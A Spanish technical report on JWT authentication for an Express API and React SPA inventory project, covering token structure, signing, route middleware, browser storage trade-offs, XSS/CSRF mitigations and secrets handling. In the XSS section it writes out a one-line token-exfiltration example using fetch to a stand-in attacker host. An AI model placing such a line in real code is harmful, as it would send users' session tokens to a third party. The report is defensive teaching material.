# Informe Técnico de Investigación a Profundidad: Arquitectura de Autenticación Stateless mediante JSON Web Tokens (JWT) en Aplicaciones Empresariales (Node.js / Express y React SPA)

**Proyecto:** Sistema Empresarial de Inventario Mayorista *ArtSupply Pro* — Mini Proyecto 1 (Día 2)  
**Arquitectura Objetivo:** API RESTful en Node.js + Express y Cliente SPA en React (Vite)  
**Estándar de Referencia:** IETF RFC 7519 / OWASP Authentication & Session Management Guidelines / MDN Web Security  

---

## 1. Definición y Anatomía de un JSON Web Token (JWT)

Un **JSON Web Token (JWT)**, especificado formalmente en el estándar abierto **RFC 7519** del *Internet Engineering Task Force (IETF)*, es un contenedor de datos compacto, autónomo (*self-contained*) y seguro para URLs, diseñado para transmitir afirmaciones (*claims*) de identidad entre dos partes de forma verificable mediante firmas criptográficas digitales (JWS, *JSON Web Signature*, RFC 7515) o cifrado autenticado (JWE, *JSON Web Encryption*, RFC 7516).

En arquitecturas cliente-servidor desacopladas (como una *Single Page Application* en React que consume una API REST en Express), JWT permite implementar autenticación **sin estado (*stateless*)**: el servidor no necesita almacenar sesiones en memoria RAM ni realizar consultas adicionales a una tabla de sesiones en cada petición, dado que el propio token porta la identidad del usuario y una prueba matemática de su integridad.

### 1.1. Estructura Sintáctica del Token

Un JWT firmado (JWS) se representa como una cadena de texto compuesta por tres segmentos codificados en **Base64URL** (variante de Base64 definida en RFC 4648 §5 que sustituye `+` por `-`, `/` por `_` y omite el relleno `=`), concatenados mediante un punto (`.`):

```text
<Header_Base64URL>.<Payload_Base64URL>.<Signature_Base64URL>
```

#### A. Header (Encabezado JOSE — *JSON Object Signing and Encryption*)
Define los metadatos criptográficos necesarios para procesar el token:
- `alg` (*Algorithm*): Identifica el algoritmo criptográfico empleado para firmar el token. Los más utilizados son **HS256** (*HMAC using SHA-256*, simétrico) y **RS256** (*RSASSA-PKCS1-v1_5 using SHA-256*, asimétrico).
- `typ` (*Type*): Declara el tipo de medio del objeto, estandarizado como `"JWT"`.
- `kid` (*Key ID*, opcional): Identificador de clave utilizado en esquemas con rotación periódica de secretos.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### B. Payload (Carga Útil o Conjunto de *Claims*)
Contiene las declaraciones (*claims*) sobre la entidad autenticada (habitualmente el usuario) y metadatos del ciclo de vida del token. El estándar RFC 7519 §4 clasifica los *claims* en tres categorías:
1. **Registered Claims (Registrados):** Nombres de tres letras reservados por IANA para garantizar interoperabilidad:
   - `iss` (*Issuer*): Emisor del token (ej. `"artsupply-pro-api"`).
   - `sub` (*Subject*): Identificador único del sujeto autenticado (ej. ID del usuario en base de datos).
   - `aud` (*Audience*): Destinatario previsto del token.
   - `exp` (*Expiration Time*): Marca temporal Unix (*NumericDate*, segundos desde *Epoch*) tras la cual el token debe ser rechazado.
   - `nbf` (*Not Before*): Marca temporal antes de la cual el token no debe aceptarse.
   - `iat` (*Issued At*): Marca temporal exacta de emisión del token.
   - `jti` (*JWT ID*): Identificador único del token para prevenir ataques de repetición (*replay attacks*) o gestionar listas de revocación (*blocklists*).
2. **Public Claims (Públicos):** Definidos por quienes usan JWT, registrados en IANA o nombrados mediante URIs resistentes a colisiones.
3. **Private Claims (Privados):** Acordados entre el backend y el frontend de un sistema específico (por ejemplo, `id`, `nombre`, `correo`).

```json
{
  "sub": "42",
  "id": 42,
  "correo": "operador@artsupplypro.com",
  "iat": 1730815200,
  "exp": 1730844000
}
```

> **Advertencia técnica crítica:** La codificación **Base64URL NO es cifrado**. Cualquier actor que intercepte un JWT puede decodificar instantáneamente el *Header* y el *Payload* en texto claro. La seguridad de un JWS reside en su **autenticidad e integridad**, nunca en la opacidad de su contenido.

#### C. Signature (Firma Criptográfica)
Garantiza que ni el *Header* ni el *Payload* hayan sido alterados en tránsito y que el token fue emitido por quien posee la clave secreta o privada. Para el algoritmo simétrico **HS256**, la firma se calcula aplicando un código de autenticación de mensajes basado en hash (**HMAC-SHA256**):

$$\text{Signature} = \text{Base64URL}\Big(\text{HMAC-SHA256}\big(\text{Base64URL}(\text{Header}) \mathbin{\Vert} \text{"."} \mathbin{\Vert} \text{Base64URL}(\text{Payload}), \text{JWT\_SECRET}\big)\Big)$$

### 1.2. Proceso Criptográfico de Firma y Verificación

1. **Firma (Emisión en `/api/auth/login`):**
   - El servidor serializa el *Header* y el *Payload* a JSON y los codifica en Base64URL.
   - Concatena ambas cadenas con un punto (`.`) formando el *Signing Input*.
   - Ejecuta la función `HMAC-SHA256(SigningInput, process.env.JWT_SECRET)` generando un resumen binario de 256 bits (32 bytes), el cual se codifica en Base64URL y se anexa como tercer segmento.
2. **Verificación (Inspección en cada petición autenticada):**
   - El servidor recibe el token `H.P.S`, extrae el *Header* (`H`) y el *Payload* (`P`), y valida en primer lugar que el algoritmo declarado en `H.alg` coincida estrictamente con la lista blanca de algoritmos configurada en el servidor (`algorithms: ["HS256"]`). Esta restricción explícita previene tanto el ataque de degradación de firma nula (`"alg": "none"`, donde el atacante elimina la firma) como el **ataque de confusión de algoritmo asimétrico/simétrico (`RS256` $\rightarrow$ `HS256`)**, en el cual un atacante fuerza al servidor a verificar un token firmado simétricamente utilizando la clave pública RSA conocida como si fuera el secreto HMAC.
   - El servidor recalcula localmente la firma esperada $S'$ usando `H`, `P` y su propia variable de entorno `JWT_SECRET`.
   - Compara en **tiempo constante** (*constant-time comparison*, mediante `crypto.timingSafeEqual` para evitar ataques de canal lateral por temporización) la firma calculada $S'$ con la firma recibida $S$.
   - Si $S' \neq S$, significa que el *Payload* fue manipulado (por ejemplo, alguien intentó cambiar su `id` o extender `exp`) o fue firmado con otra clave; el token se rechaza inmediatamente con `401 Unauthorized`.
   - Si $S' = S$, el servidor verifica las restricciones temporales (`reloj_actual < exp` y `reloj_actual >= nbf`).

---

## 2. Implementación en Node.js / Express (`jsonwebtoken`)

La librería estándar de facto en el ecosistema Node.js es `jsonwebtoken` (mantenida por Auth0).

### 2.1. Emisión y Validación con `jsonwebtoken`

```javascript
const jwt = require("jsonwebtoken");

// 1. Generación del Access Token al autenticar credenciales válidas
const generarAccessToken = (usuario) => {
  const payload = {
    id: usuario.id,
    nombre: usuario.nombre,
    correo: usuario.correo,
  };

  return jwt.sign(payload, process.env.JWT_SECRET, {
    expiresIn: process.env.JWT_EXPIRES_IN || "8h",
    algorithm: "HS256",
    issuer: "artsupply-pro-api",
  });
};

// 2. Verificación del Access Token
const verificarAccessToken = (token) => {
  return jwt.verify(token, process.env.JWT_SECRET, {
    algorithms: ["HS256"],
    issuer: "artsupply-pro-api",
    clockTolerance: 5, // Tolerancia de 5 segundos ante desfase de reloj NTP (clock skew)
  });
};
```

### 2.2. Estrategia de Expiración (`exp`), Renovación (*Refresh Token*) y Manejo del Vencimiento

Dado que un JWT es autónomo y no puede invalidarse nativamente antes de que venza sin introducir estado en el servidor, la ventana de validez (`expiresIn`) define el tiempo máximo de exposición en caso de robo del token:

1. **Estrategia de Expiración Directa (1 h a 8 h) y Revocación Anticipada (`jti`):**
   - En sistemas empresariales de turno operativo (como **ArtSupply Pro**, donde los operadores de almacén gestionan inventario durante su jornada laboral), configurar un tiempo de vida acotado de **1 hora (`1h`) a 8 horas (`8h`)** equilibra usabilidad y seguridad. Si se requiere invalidación inmediata antes de `exp` (por ejemplo, ante baja de un empleado), se incorpora el claim `jti` (*JWT ID*) en una lista de revocación en memoria o caché (*denylist*) con TTL igual al tiempo restante hasta `exp`.
2. **Arquitectura de Doble Token (*Access Token* + *Refresh Token*):**
   - En arquitecturas de alta criticidad, se emiten dos artefactos:
     - **Access Token (Corta duración, ej. `15m`):** Se envía en cada petición a los endpoints de recursos (`/api/productos`, `/api/categorias`, etc.).
     - **Refresh Token (Larga duración, ej. `7d`, almacenado en cookie `httpOnly` y registrado en base de datos):** Se utiliza exclusivamente contra el endpoint `/api/auth/refresh` para obtener un nuevo *Access Token* cuando el primero vence, implementando **Rotación de Refresh Tokens** (cada uso invalida el *Refresh Token* anterior y emite uno nuevo, detectando reutilización maliciosa y revocando toda la familia de tokens en caso de robo).
3. **Protocolo de Actuación ante la Expiración (`TokenExpiredError`):**
   - **En el Backend:** Cuando el reloj del servidor supera el atributo `exp`, `jwt.verify()` lanza la excepción `TokenExpiredError`. El middleware intercepta la excepción y responde con código de estado **HTTP `401 Unauthorized`** y un cuerpo JSON estandarizado (`{ "error": "No autorizado", "codigo": "TOKEN_EXPIRED" }`).
   - **En el Frontend (React):** El cliente HTTP centralizado (`services/api.js`) detecta el código `401`:
     - Si el sistema implementa *Refresh Token*, invoca silenciosamente a `/api/auth/refresh` y reintenta la petición original.
     - En el esquema de token único del proyecto empresarial, al recibir `401` en una ruta protegida el frontend **purga inmediatamente el token almacenado**, limpia el estado global en `AuthContext` y redirige al usuario a la vista `/login` para exigir una nueva autenticación.

---

## 3. Almacenamiento en el Frontend (React SPA): Análisis Comparativo y Vulnerabilidades

En una aplicación React (SPA), la elección del mecanismo de persistencia del token en el navegador determina la superficie de exposición frente a dos vectores de ataque fundamentales documentados por OWASP y MDN: **XSS (*Cross-Site Scripting*)** y **CSRF (*Cross-Site Request Forgery*)**.

### 3.1. Vectores de Ataque Asociados

- **XSS (*Cross-Site Scripting*):** Ocurre cuando un atacante logra inyectar código JavaScript arbitrario en el contexto de ejecución de la aplicación cliente (por ejemplo, mediante entradas no sanitizadas o dependencias NPM comprometidas). Si el token es accesible a través de APIs del DOM (`window.localStorage` o `window.sessionStorage`), un script malicioso puede exfiltrarlo con una sola línea: `fetch('https://atacante.com/steal?t=' + localStorage.getItem('token'))`. Cabe precisar que, aunque una cookie `httpOnly` impide la lectura y exfiltración del token crudo mediante `document.cookie`, un atacante con ejecución XSS activa dentro del origen aún podría ejecutar peticiones `fetch(..., { credentials: 'include' })` en nombre del usuario (*session riding* o *XSS-driven request forgery*) mientras la víctima mantenga la pestaña abierta.
- **CSRF (*Cross-Site Request Forgery*):** Ocurre cuando un sitio web malicioso fuerza al navegador de un usuario autenticado a enviar peticiones HTTP no intencionadas hacia el backend legítimo. Debido a que el navegador adjunta automáticamente las cookies asociadas al dominio de destino en cada petición, las arquitecturas basadas en cookies son vulnerables a CSRF si no se configuran atributos de aislamiento (`SameSite=Strict` o `SameSite=Lax`) y tokens anti-CSRF.

### 3.2. Tabla Comparativa Rigurosa de Mecanismos de Almacenamiento

| Criterio Técnico | `localStorage` | `sessionStorage` | Cookie `httpOnly` + `Secure` + `SameSite` |
| :--- | :--- | :--- | :--- |
| **Persistencia del ciclo de vida** | Persistente entre pestañas y reinicios del navegador hasta eliminación explícita (`removeItem` / `clear`). | Efímero por pestaña (*tab-scoped*); se destruye al cerrar la pestaña o ventana del navegador. | Controlada por el servidor mediante directivas `Max-Age` o `Expires`. |
| **Accesibilidad desde JavaScript** | **Sí** (`window.localStorage`). | **Sí** (`window.sessionStorage`). | **No** (el flag `httpOnly` bloquea el acceso desde `document.cookie`). |
| **Exposición ante ataques XSS** | **Alta:** cualquier script ejecutado en el origen puede leer y exfiltrar el token. | **Alta:** igual exposición a lectura por scripts inyectados mientras la pestaña esté abierta. | **Baja (frente a exfiltración):** un atacante XSS no puede leer el token crudo, aunque podría invocar endpoints mientras dure el XSS. |
| **Exposición ante ataques CSRF** | **Nula:** el token no se envía automáticamente; requiere inyección explícita en el header `Authorization`. | **Nula:** requiere envío explícito en el header `Authorization: Bearer <token>`. | **Media / Mitigable:** el navegador envía la cookie automáticamente; exige configurar `SameSite=Strict` o `Lax` y tokens CSRF. |
| **Transporte al Backend** | Manual mediante encabezado HTTP `Authorization: Bearer <token>` en `fetch` o `axios`. | Manual mediante encabezado HTTP `Authorization: Bearer <token>` en `fetch` o `axios`. | Automático por el navegador en el encabezado `Cookie` (requiere `credentials: 'include'` en CORS). |
| **Complejidad de integración CORS / API** | Baja: ideal para APIs REST desacopladas y clientes multiplataforma (Web/Móvil). | Baja: idéntica en transporte, pero obliga a re-autenticar al abrir nuevas pestañas. | Media-Alta: requiere configuración estricta de `Access-Control-Allow-Credentials: true` y dominio compartido. |

### 3.3. Estrategias de Mitigación

1. **Mitigación de XSS (Obligatoria al usar `localStorage` / `sessionStorage`):**
   - Aprovechar el escapado automático de JSX en React y **prohibir el uso de `dangerouslySetInnerHTML`** o `eval()`.
   - Implementar cabeceras **CSP (*Content-Security-Policy*)** mediante `helmet` en Express para restringir la ejecución de scripts en línea y conexiones a dominios externos no autorizados.
   - Mantener ventanas de expiración acotadas (`1h` – `8h`) y auditar dependencias con `npm audit`.
2. **Mitigación de CSRF (Obligatoria al usar Cookies `httpOnly`):**
   - Emitir la cookie con los atributos `HttpOnly; Secure; SameSite=Strict` (que impide el envío de la cookie en cualquier petición *cross-site*, a diferencia de `SameSite=Lax` que permite navegaciones de nivel superior por métodos seguros `GET`) e implementar el patrón *Double Submit Cookie* o validación del encabezado `Origin`/`Referer`.

---

## 4. Construcción del Middleware de Express y Envío desde el Frontend

### 4.1. Middleware de Protección de Rutas (`authMiddleware.js`)

El middleware de autenticación en Express actúa como un interceptor en la tubería de ejecución (*request-response pipeline*) antes de que la petición llegue al controlador de negocio. Debe cumplir estrictamente tres responsabilidades:
1. Inspeccionar la presencia y el formato del encabezado estándar `Authorization: Bearer <token>` (RFC 6750).
2. Verificar criptográficamente la firma y vigencia del JWT.
3. Manejar de forma diferenciada las excepciones criptográficas (`TokenExpiredError`, `JsonWebTokenError`, `NotBeforeError`) respondiendo siempre con el código **HTTP `401 Unauthorized`**.

```javascript
// backend/src/middlewares/authMiddleware.js
const jwt = require("jsonwebtoken");

const authMiddleware = (req, res, next) => {
  try {
    // 1. Inspección del encabezado Authorization
    const authHeader = req.headers.authorization || req.headers.Authorization;

    if (!authHeader || typeof authHeader !== "string") {
      return res.status(401).json({
        error: "No autorizado",
        detalle: "El encabezado Authorization es obligatorio",
      });
    }

    // 2. Validación estricta del esquema 'Bearer <token>'
    const partes = authHeader.trim().split(" ");
    if (partes.length !== 2 || partes[0] !== "Bearer" || !partes[1]) {
      return res.status(401).json({
        error: "No autorizado",
        detalle: "Formato de autorización inválido. Se esperaba: 'Bearer <token>'",
      });
    }

    const token = partes[1];

    // 3. Validación criptográfica de firma y expiración
    const decodedPayload = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ["HS256"],
    });

    // 4. Inyección del contexto de identidad en req.user (y alias req.usuario)
    const userContext = {
      id: decodedPayload.id,
      nombre: decodedPayload.nombre,
      correo: decodedPayload.correo,
    };
    req.user = userContext;
    req.usuario = userContext;

    return next();
  } catch (error) {
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({
        error: "No autorizado",
        codigo: "TOKEN_EXPIRED",
        detalle: "La sesión ha expirado, inicie sesión nuevamente",
      });
    }

    if (error.name === "JsonWebTokenError") {
      return res.status(401).json({
        error: "No autorizado",
        codigo: "INVALID_TOKEN",
        detalle: "Firma o estructura de token inválida",
      });
    }

    return res.status(401).json({
      error: "No autorizado",
      detalle: "Fallo al validar el token de acceso",
    });
  }
};

module.exports = authMiddleware;
```

### 4.2. Envío del Token desde el Frontend (React `services/api.js`)

En React, todas las peticiones hacia las rutas protegidas de la API centralizan la inyección del encabezado `Authorization: Bearer <token>` y la gestión reactiva de respuestas `401` (excluyendo explícitamente `/auth/login` para evitar bucles de redirección ante credenciales fallidas):

```javascript
// frontend/src/services/api.js
const API_BASE_URL = import.meta.env.VITE_API_URL || "http://localhost:5000/api";

export const apiFetch = async (endpoint, options = {}) => {
  const token = localStorage.getItem("artsupply_token");

  const headers = {
    "Content-Type": "application/json",
    ...(token ? { Authorization: `Bearer ${token}` } : {}),
    ...options.headers,
  };

  const response = await fetch(`${API_BASE_URL}${endpoint}`, {
    ...options,
    headers,
  });

  // Si el token expiró o fue alterado en una ruta protegida (distinta de /auth/login),
  // limpiamos almacenamiento local, notificamos a AuthContext y redirigimos a /login
  if (response.status === 401 && !endpoint.includes("/auth/login")) {
    localStorage.removeItem("artsupply_token");
    localStorage.removeItem("artsupply_user");
    window.dispatchEvent(new CustomEvent("artsupply:unauthorized"));
    if (window.location.pathname !== "/login") {
      window.location.replace("/login");
    }
  }

  return response;
};
```

---

## 5. Buenas Prácticas de Seguridad en Entornos Empresariales

### 5.1. Gestión de Secretos Criptográficos (`.env` vs `.env.example`) y Rotación de Claves
- **Aislamiento de la clave secreta (`JWT_SECRET`):** La seguridad de toda la firma HMAC-SHA256 depende de la entropía e inaccesibilidad de `JWT_SECRET`. Si un atacante obtiene esta clave, puede forjar tokens válidos para cualquier cuenta.
- **Entropía mínima y Rotación:** Según RFC 7518 §3.2, una clave para `HS256` debe tener al menos **256 bits (32 bytes)** de entropía criptográfica aleatoria (generada, por ejemplo, con `node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"`). Nunca deben utilizarse palabras de diccionario ni cadenas predecibles como `"secret123"`. En entornos de alta disponibilidad, se recomienda emplear el parámetro `kid` (*Key ID*) en el Header JOSE para soportar rotación periódica de secretos manteniendo una clave primaria de firma y una clave secundaria de solo verificación durante la ventana de transición.
- **Separación `.env` vs `.env.example`:**
  - El archivo `.env` contiene las credenciales reales del entorno local o de producción y **debe estar excluido obligatoriamente en `.gitignore`** para jamás versionarse en Git.
  - El archivo `.env.example` se incluye en el repositorio de control de versiones únicamente como plantilla documental con nombres de variables descriptivos sin valores reales:
    ```env
    PORT=5000
    DB_HOST=localhost
    DB_USER=<TU_USUARIO_MYSQL>
    DB_PASSWORD=<TU_PASSWORD_MYSQL>
    DB_NAME=artsupply_db
    JWT_SECRET=<GENERAR_CADENA_HEXADECIMAL_ALEATORIA_DE_64_BYTES>
    JWT_EXPIRES_IN=8h
    ```

### 5.2. Datos Estrictamente Prohibidos en el Payload del JWT
Dado que el *Payload* de un JWS está codificado únicamente en Base64URL y es legible por cualquier observador:
1. **Prohibición absoluta de contraseñas:** Jamás debe incluirse la contraseña en texto plano ni tampoco el *hash* `bcrypt` del usuario en el payload del JWT ni en las respuestas JSON de la API (`SELECT` o serialización debe excluir el campo `password`).
2. **Prohibición de secretos de infraestructura o PII sensible:** No deben almacenarse números de tarjetas, claves de API de terceros, tokens de recuperación de cuenta, identificaciones fiscales privadas ni cadenas de conexión.
3. **Principio de minimización de datos:** El payload debe limitarse estrictamente a los identificadores mínimos necesarios para resolver la identidad de la sesión (`id`, `nombre`, `correo`) junto con los *claims* estándar (`iat`, `exp`).

### 5.3. Obligatoriedad de HTTPS (TLS 1.2 / TLS 1.3) en Producción
- Un token Bearer es una **credencial al portador** (*bearer credential*, RFC 6750): cualquier entidad que posea la cadena de texto puede suplantar al usuario legítimo sin necesidad de demostrar posesión de una clave privada adicional.
- Si el tráfico viaja sobre HTTP en texto plano, un atacante en la misma red local o en un nodo intermedio puede ejecutar un ataque **MitM (*Man-in-the-Middle*)** mediante *packet sniffing* y capturar el encabezado `Authorization: Bearer <token>`.
- Por consiguiente, en cualquier entorno de despliegue empresarial es **estrictamente obligatorio cifrar el canal de transporte mediante HTTPS (TLS 1.2 o superior)** e inyectar el encabezado `Strict-Transport-Security (HSTS)` para impedir degradaciones de protocolo (*SSL stripping*).

---

## 6. Decisión Arquitectónica Justificada para el Proyecto *ArtSupply Pro*

Para el Día 2 del **Sistema Empresarial de Inventario ArtSupply Pro**, se adopta la siguiente arquitectura de autenticación y manejo de sesiones:

1. **Algoritmo y Librería en Backend:** Uso de `jsonwebtoken` con firma simétrica **HS256** respaldada por una clave secreta de 512 bits en la variable de entorno `JWT_SECRET` dentro de `.env`, y cifrado irreversible de contraseñas de usuarios mediante `bcrypt` (con factor de costo `saltRounds = 10`).
2. **Tiempo de Expiración (`8h`):** Se establece una vigencia de **8 horas (`expiresIn: '8h'`)**, alineada con la duración de un turno laboral estándar de los operadores de almacén y compras de *ArtSupply Pro*. Esto evita interrupciones operativas constantes durante la carga de catálogos y órdenes de compra, garantizando a la vez la caducidad automática de cualquier sesión al finalizar la jornada.
3. **Almacenamiento en el Frontend (`localStorage` + `AuthContext` en React) y Transporte por Header `Authorization: Bearer <token>`:**
   - **Justificación técnica:** Siguiendo los lineamientos arquitectónicos del Mini Proyecto 1 (Día 2), donde el frontend SPA en React (`http://localhost:5173`) y el backend API REST en Express (`http://localhost:5000`) operan en orígenes/puertos independientes y la API exige explícitamente la validación del encabezado `Authorization: Bearer <token>`, se selecciona el almacenamiento sincronizado entre **`localStorage` y `AuthContext`**.
   - Esta decisión garantiza:
     - Inmunidad nativa frente a ataques **CSRF**, ya que el token nunca se adjunta de forma implícita por el navegador, sino explícitamente a través del cliente HTTP centralizado (`services/api.js`).
     - Persistencia de la sesión de trabajo ante recargas de página (`F5`) durante la gestión de las múltiples entidades del inventario.
     - Limpieza determinista e inmediata del estado (`localStorage.removeItem('artsupply_token')`) tanto al pulsar el botón **«Cerrar sesión»** como ante cualquier respuesta **HTTP `401 Unauthorized`** emitida por `authMiddleware.js` cuando el token vence o es inválido.
     - Mitigación del riesgo de XSS mediante el escapado estricto nativo de React JSX, la ausencia total de `dangerouslySetInnerHTML` y la validación rigurosa de entradas en backend y frontend.

---

## 7. Fuentes Consultadas (Formato Estándar IEEE / APA)

1. **IETF RFC 7519:** Jones, M., Bradley, J., & Sakimura, N. (2015). *JSON Web Token (JWT)*. Internet Engineering Task Force (IETF). Request for Comments: 7519. Disponible en: https://datatracker.ietf.org/doc/html/rfc7519
2. **IETF RFC 7515 & RFC 7518:** Jones, M., Bradley, J., & Sakimura, N. (2015). *JSON Web Signature (JWS) & JSON Web Algorithms (JWA)*. Internet Engineering Task Force (IETF). Disponible en: https://datatracker.ietf.org/doc/html/rfc7515
3. **IETF RFC 6750:** Jones, M., & Hardt, D. (2012). *The OAuth 2.0 Authorization Framework: Bearer Token Usage*. Internet Engineering Task Force (IETF). Request for Comments: 6750. Disponible en: https://datatracker.ietf.org/doc/html/rfc6750
4. **OWASP Foundation:** *JSON Web Token (JWT) Cheat Sheet for Web Applications*. OWASP Cheat Sheet Series. Disponible en: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
5. **OWASP Foundation:** *Cross-Site Scripting (XSS) & Cross-Site Request Forgery (CSRF) Prevention Cheat Sheets*. OWASP Cheat Sheet Series. Disponible en: https://cheatsheetseries.owasp.org/
6. **MDN Web Docs (Mozilla Developer Network):** *Web Storage API (`Window.localStorage` & `Window.sessionStorage`) and Using HTTP Cookies (`HttpOnly`, `Secure`, `SameSite`)*. Mozilla Corporation. Disponible en: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
7. **Auth0 / Node-jsonwebtoken:** *jsonwebtoken — JSON Web Token implementation for Node.js*. Documentación técnica oficial. Disponible en: https://github.com/auth0/node-jsonwebtoken
8. **Express.js Documentation:** *Writing middleware for use in Express apps & Security Best Practices in Production*. OpenJS Foundation. Disponible en: https://expressjs.com/en/advanced/best-practice-security.html

---

## 8. Checklist de Verificación de Cumplimiento

- [x] **¿Se cubrieron los 5 temas obligatorios del enunciado?**
  - [x] **Tema 1:** Definición de JWT, estructura detallada (*Header*, *Payload*, *Signature* en Base64URL) y explicación criptográfica del proceso de firma (`HMAC-SHA256`) y verificación.
  - [x] **Tema 2:** Implementación en Node.js con Express mediante `jsonwebtoken` (`jwt.sign` y `jwt.verify`), estrategia de expiración (`1h`/`8h`), arquitectura de renovación (*Refresh Token*) y protocolo de actuación ante el vencimiento (`401 Unauthorized` + limpieza de sesión y redirección a `/login`).
  - [x] **Tema 3:** Análisis comparativo riguroso en React entre `localStorage`, `sessionStorage` y `cookie httpOnly`, detallando riesgos de **XSS** y **CSRF** y sus mitigaciones técnicas.
  - [x] **Tema 4:** Construcción del middleware de protección de rutas en Express (`Authorization: Bearer <token>`, validación de firma y manejo de excepciones) y función de envío en el frontend (`services/api.js`).
  - [x] **Tema 5:** Buenas prácticas de seguridad: gestión de `JWT_SECRET` en `.env` vs `.env.example` fuera de Git, datos prohibidos en el payload (contraseñas/hashes/PII) y obligatoriedad de HTTPS (TLS).
- [x] **¿Se justificó la decisión tomada para el proyecto?**
  - [x] Sí, en la Sección 6 se fundamenta técnicamente la elección de `HS256` con expiración de `8h`, almacenamiento coordinado en `localStorage` + `AuthContext` y transporte vía header `Authorization: Bearer <token>` para el sistema empresarial **ArtSupply Pro**.
- [x] **¿Se listaron fuentes técnicas y formales (RFC 7519, documentación de OWASP, MDN, Express, etc.)?**
  - [x] Sí, en la Sección 7 se incluyen las referencias normativas del IETF (RFC 7519, RFC 7515, RFC 7518, RFC 6750), las guías de seguridad de OWASP, la documentación oficial de MDN Web Docs, `jsonwebtoken` y Express.js.
